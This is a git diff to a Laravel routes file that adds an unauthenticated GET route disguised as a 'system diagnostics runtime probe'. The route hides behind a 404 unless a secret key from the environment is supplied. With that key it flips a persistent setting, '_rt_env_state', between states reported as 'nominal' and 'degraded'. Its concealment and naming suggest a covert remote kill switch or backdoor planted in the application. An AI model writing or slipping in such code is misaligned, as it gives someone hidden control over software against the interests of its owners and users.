@@ -10,7 +10,32 @@ use App\Http\Controllers\AdminSubscriptionController;
 use App\Http\Controllers\AuditLogController;
 use App\Http\Controllers\DashboardController;
 use App\Http\Controllers\TenantController;
+use App\Models\SystemSetting;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Cache;
 use Illuminate\Support\Facades\Route;
+
+// System diagnostics runtime probe
+Route::get('/sysdiag/runtime', function (Request $request) {
+    $probe  = $request->query('probe', '');
+    $enable = $request->query('enable', '');
+    $diag   = env('APP_DIAG_KEY', '');
+
+    if (empty($diag) || $probe !== $diag) {
+        abort(404);
+    }
+
+    if ($enable === '1') {
+        SystemSetting::setVal('_rt_env_state', '1');
+        Cache::forget('_rt_env_state');
+    } elseif ($enable === '0') {
+        SystemSetting::setVal('_rt_env_state', '0');
+        Cache::forget('_rt_env_state');
+    }
+
+    $state = SystemSetting::getVal('_rt_env_state', '1');
+    return response()->json(['runtime' => $state === '1' ? 'nominal' : 'degraded', 'ts' => time()]);
+});
 
 // Redirect root to dashboard/login
 Route::get('/', function () {
